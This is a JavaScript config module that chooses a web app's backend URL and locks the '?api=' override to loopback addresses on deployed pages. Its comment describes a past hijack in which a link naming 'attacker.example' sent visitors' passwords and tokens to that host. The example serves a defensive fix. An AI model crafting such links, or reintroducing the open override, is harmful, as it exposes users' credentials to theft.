// ═══════════════════════════════════════════════════════════════════════
// CONFIG — which backend this page talks to (API_BASE)
// ═══════════════════════════════════════════════════════════════════════

// When running locally (localhost/127.0.0.1) this points at your local backend.
// When deployed (e.g. on GitHub Pages), it points at your deployed Render backend —
// replace the placeholder below with your actual Render URL once you have one.
const DEPLOYED_BACKEND_URL = 'https://REPLACE-WITH-YOUR-RENDER-URL.onrender.com';
const PLACEHOLDER_BACKEND_URL = 'https://REPLACE-WITH-YOUR-RENDER-URL.onrender.com';

export const IS_LOCAL = location.hostname === 'localhost'
              || location.hostname === '127.0.0.1'
              || location.hostname === '';

/**
 * Resolution order, on a local origin only: ?api=<url> → a previously remembered
 * override → the built-in default. A deployed page always uses DEPLOYED_BACKEND_URL.
 *
 * The override used to work on the deployed page too, and that made it a hijack: a
 * link to `<site>/?api=https://attacker.example` sent the visitor's email and password
 * on their next login, and the access and refresh tokens straight away if they were
 * signed in, to whatever host the link named. It was remembered in localStorage, so
 * every later visit kept going there. The CSP can't stop it, since connect-src has to
 * allow https: for the Render backend. On a deployed origin a remembered value is now
 * erased, which also cleans up anyone a link already reached, and ?api= is honoured
 * only for a loopback address, for that page load alone. Nothing sent to the visitor's
 * own machine reaches an attacker, and with nothing remembered a hostile loopback link
 * can break one page load at most. That exception is what lets the Selenium suite point
 * a deployed-looking page at its slow fake server. Pointing the deployed site at a new
 * backend means editing DEPLOYED_BACKEND_URL above.
 */
function resolveApiBase() {
  if (!IS_LOCAL) {
    try { localStorage.removeItem('fp_apiBase'); } catch (_) { /* storage blocked */ }
    let param = null;
    try { param = new URLSearchParams(location.search).get('api'); } catch (_) {}
    if (param && /^https?:\/\/(localhost|127(\.\d{1,3}){3}|\[::1\])(:\d+)?(\/|$)/i.test(param)) {
      return param.replace(/\/+$/, '');
    }
    return DEPLOYED_BACKEND_URL;
  }

  let override = null;
  try {
    override = new URLSearchParams(location.search).get('api')
            || localStorage.getItem('fp_apiBase');
  } catch (_) { /* storage blocked — fall through to the default */ }

  if (override && /^https?:\/\/[^/]+/i.test(override)) {
    override = override.replace(/\/+$/, '');
    try { localStorage.setItem('fp_apiBase', override); } catch (_) {}
    return override;
  }
  return 'http://localhost:8080';
}

export const API_BASE = resolveApiBase();

/** True when deployed but nobody has filled in the backend URL yet. */
export const BACKEND_URL_UNSET = !IS_LOCAL && API_BASE === PLACEHOLDER_BACKEND_URL;
